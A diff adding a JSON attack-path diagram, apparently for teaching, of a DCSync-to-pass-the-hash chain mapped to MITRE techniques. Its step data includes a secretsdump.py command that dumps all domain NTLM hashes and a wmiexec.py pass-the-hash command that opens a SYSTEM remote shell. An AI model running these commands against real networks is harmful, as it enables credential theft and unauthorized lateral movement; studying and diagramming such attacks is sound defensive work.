@@ -1,0 +1,103 @@
+{
+  "title": "DCSync to Pass-The-Hash",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "type": "container",
+      "icon": "IconKali",
+      "members": [
+        "secretsdump_tool",
+        "psexec_tool",
+        "ntlm_hashes"
+      ]
+    },
+    {
+      "id": "secretsdump_tool",
+      "label": "secretsdump.py",
+      "type": "node",
+      "icon": "IconCode"
+    },
+    {
+      "id": "ntlm_hashes",
+      "label": "NTDS.DIT NTLM Hashes",
+      "type": "node",
+      "icon": "IconKey"
+    },
+    {
+      "id": "psexec_tool",
+      "label": "wmiexec / psexec",
+      "type": "node",
+      "icon": "IconTerminal"
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "type": "container",
+      "icon": "IconNetwork",
+      "members": [
+        "domain_controller",
+        "target_machine"
+      ]
+    },
+    {
+      "id": "domain_controller",
+      "label": "Domain Controller",
+      "type": "node",
+      "icon": "IconServer"
+    },
+    {
+      "id": "target_machine",
+      "label": "Target Host",
+      "type": "node",
+      "icon": "IconWorkstation"
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "Execute DCSync",
+      "type": "edge",
+      "from": "secretsdump_tool",
+      "to": "domain_controller",
+      "description": "The attacker natively utilizes the MS-DRSR replication APIs, asking the DC to replicate all password hashes.",
+      "cli": "secretsdump.py marvel.local/fcastle:Pass123@10.0.0.12 -just-dc",
+      "mitre": {
+        "id": "T1003.006",
+        "tactic": "Credential Access",
+        "technique": "OS Credential Dumping: DCSync"
+      }
+    },
+    {
+      "id": 2,
+      "name": "Extract NTLM Dump",
+      "type": "edge",
+      "from": "domain_controller",
+      "to": "ntlm_hashes",
+      "description": "The DC complies, transmitting the cryptographic equivalents of every password in the enterprise."
+    },
+    {
+      "id": 3,
+      "name": "Pass-The-Hash (PTH)",
+      "type": "edge",
+      "from": "ntlm_hashes",
+      "to": "psexec_tool",
+      "description": "The attacker feeds a highly privileged hash directly into a lateral movement tool."
+    },
+    {
+      "id": 4,
+      "name": "Establish Interactive Shell",
+      "type": "edge",
+      "from": "psexec_tool",
+      "to": "target_machine",
+      "description": "The tool authenticates to the target utilizing the mathematical hash alone, popping a SYSTEM level remote shell.",
+      "cli": "wmiexec.py -hashes aad3b...:31d6c... marvel.local/Admin@10.0.0.50",
+      "mitre": {
+        "id": "T1550.002",
+        "tactic": "Lateral Movement",
+        "technique": "Use Alternate Authentication Material: Pass the Hash"
+      }
+    }
+  ]
+}
